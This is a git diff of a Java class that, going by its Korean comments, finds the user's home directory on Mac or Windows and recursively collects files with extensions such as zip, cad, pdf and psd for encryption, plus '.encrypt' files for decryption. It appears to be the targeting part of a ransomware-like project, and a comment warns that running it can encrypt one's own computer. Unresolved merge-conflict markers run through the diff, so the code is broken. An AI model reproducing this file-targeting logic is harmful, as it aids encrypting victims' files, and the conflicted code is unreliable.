@@ -11,36 +11,79 @@ import java.util.List;
  */
 public class SearchDirectory {
 
-    private boolean isWindow;
+<<<<<<< HEAD
     private String defaultDirectiory;
+
+    private ArrayList<File> allFiles = new ArrayList<>();
+    private ArrayList<File> encryptedFiles = new ArrayList<>();
+
+    private ArrayList<String> containsfilters = new ArrayList<>();
+
+=======
+    private boolean isWindow;
+    private String defaultDirectory;
     private List<File> allFiles = new ArrayList<>();
     private List<String> containsfilters = new ArrayList<>();
     private int filecounts = 0;
+>>>>>>> origin/master
 
     public SearchDirectory()
     {
         /**
          * !!!주의!!!
-         * 암호화 테스트 코드를 실행할 때에는 절대 setDefaultDirectiory()를 사용하여 테스트를 하지 마세요
+         * 암호화 테스트 코드를 실행할 때에는 절대 setDefaultDirectory()를 사용하여 테스트를 하지 마세요
          * 본인의 컴퓨터가 암호화 될 수 있습니다
          **/
 
-
-
         //1. 암호화 할 경로 설정
-//        setDefaultDirectiory("/Users/codertimo/Develop/EncryptionTest/");
-        setDefaultDirectiory();
+
+        setDefaultDirectory("/Users/codertimo/Desktop/test/");
+ //        setDefaultDirectiory();
+
+<<<<<<< HEAD
+=======
+        //1. 암호화 할 경로 설정
+        setDefaultDirectory("C:\\test");
+        //setDefaultDirectory();
+>>>>>>> origin/master
 
         //2. 암호화할 파일 타입을 설정
         initContainFilter();
 
-        //3.
+    }
+
+    public ArrayList<File> allFileSearch()
+    {
+
+        System.out.println("디렉토리 검색 시작");
+<<<<<<< HEAD
+
+        System.out.println(defaultDirectiory);
+
+        getFileList(defaultDirectiory);
+
+=======
+        System.out.println(defaultDirectory);
+        subDirList(defaultDirectory);
+>>>>>>> origin/master
+        System.out.println("디렉토리 검색 끝");
+
+        return allFiles;
+    }
+
+    public ArrayList<File> decryptSearch()
+    {
 
         System.out.println("디렉토리 검색 시작");
         System.out.println(defaultDirectiory);
-        subDirList(defaultDirectiory);
+
+        getEncryptedList(defaultDirectiory);
+
         System.out.println("디렉토리 검색 끝");
+
+        return encryptedFiles;
     }
+
 
     /**
      * 암호화할 코드
@@ -58,43 +101,54 @@ public class SearchDirectory {
         containsfilters.add("max");
         containsfilters.add("cad");
         containsfilters.add("zip");
+<<<<<<< HEAD
+        containsfilters.add("pdf");
+        containsfilters.add("psd");
+=======
+        containsfilters.add("txt");
+>>>>>>> origin/master
     }
+
 
     /**
      * OS별 최상위 디렉토리 설정
      */
-    private void setDefaultDirectiory()
+    private void setDefaultDirectory()
     {
         String os = System.getProperty("os.name").split(" ")[0];
         switch (os)
         {
             case "Mac":
+<<<<<<< HEAD
+=======
                 isWindow = false;
-                setMacDefaultDirectiory();
+>>>>>>> origin/master
+                setMacDefaultDirectory();
                 break;
 
             case "Windows":
-                isWindow = true;
                 setWindowDefaultDirectory();
                 break;
-
-            default:
-                isWindow = false;
         }
     }
 
     /**
      * 최상위 디렉토리 사용자 설정
-     * @param defaultDirectiory
+     * @param defaultDirectory
      */
-    private void setDefaultDirectiory(String defaultDirectiory)
+    private void setDefaultDirectory(String defaultDirectory)
     {
-        this.defaultDirectiory = defaultDirectiory;
+<<<<<<< HEAD
+        this.defaultDirectiory = defaultDirectory;
+=======
+        this.defaultDirectory = defaultDirectory;
+>>>>>>> origin/master
     }
+
     /**
      * 기본 디렉토리 설정 : Mac 용
      */
-    private void setMacDefaultDirectiory()
+    private void setMacDefaultDirectory()
     {
         File macDir = new File("/Users/");
         File[] fileList = macDir.listFiles();
@@ -104,7 +158,7 @@ public class SearchDirectory {
                     System.out.println(file.getName());
                     if (!file.getName().equals("Guest") && !file.getName().equals("Shared"))
                     {
-                        this.defaultDirectiory = file.getCanonicalPath();
+                        this.defaultDirectory = file.getCanonicalPath();
                     }
                 }
             }
@@ -126,7 +180,11 @@ public class SearchDirectory {
             if (fileList != null) {
                 for (File file : fileList) {
                     if (!file.getName().equals("Public")) {
-                        this.defaultDirectiory = file.getCanonicalPath();
+<<<<<<< HEAD
+                        this.defaultDirectiory= file.getCanonicalPath();
+=======
+                        this.defaultDirectory = file.getCanonicalPath();
+>>>>>>> origin/master
                     }
                 }
             }
@@ -141,7 +199,35 @@ public class SearchDirectory {
      * souce에 주어진 경로에 있는 모든 파일을 훑음, 또한 하위 디렉토리 존재시, 재귀로 다시 호출
      * @param source
      */
-    private void subDirList(String source){
+    private void getFileList(String source){
+        File dir = new File(source);
+        File[] fileList = dir.listFiles();
+        try{
+            if (fileList != null) {
+                for(File file : fileList){
+                    if(file.isFile()){
+
+                        // 파일이 있다면 파일 추가
+                        if(isAvailableFile(file)) {
+                            allFiles.add(file);
+                        }
+                    }
+                    else if(file.isDirectory())
+                    {
+                        // 서브디렉토리가 존재하면 재귀적 방법으로 다시 탐색
+                        System.out.println(file.getCanonicalPath());
+                        getFileList(file.getCanonicalPath());
+                        System.out.println("----------------------");
+                    }
+                }
+            }
+        }
+        catch(Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    private void getEncryptedList(String source){
         File dir = new File(source);
         File[] fileList = dir.listFiles();
         try{
@@ -149,15 +235,17 @@ public class SearchDirectory {
                 for(File file : fileList){
                     if(file.isFile()){
                         // 파일이 있다면 파일 추가
-                        if(isAvailableFile(file)) {
-                            allFiles.add(file);
-                            System.out.println(file.getName());
+                        if(FilenameUtils.getExtension(file.getName()).equals("encrypt"))
+                        {
+                            encryptedFiles.add(file);
                         }
                     }
                     else if(file.isDirectory())
                     {
                         // 서브디렉토리가 존재하면 재귀적 방법으로 다시 탐색
-                        subDirList(file.getCanonicalPath());
+                        System.out.println(file.getCanonicalPath());
+                        getEncryptedList(file.getCanonicalPath());
+                        System.out.println("----------------------");
                     }
                 }
             }
@@ -172,10 +260,16 @@ public class SearchDirectory {
      * @param file
      * @return
      */
+
     private boolean isAvailableFile(File file)
     {
-//        System.out.println(FilenameUtils.getExtension(file.getName()));
-        return this.containsfilters.contains(FilenameUtils.getExtension(file.getName()));
+            return this.containsfilters.contains(FilenameUtils.getExtension(file.getName()));
+    }
+
+    public void clearFiles()
+    {
+        this.encryptedFiles.clear();
+        this.allFiles.clear();
     }
 
 }
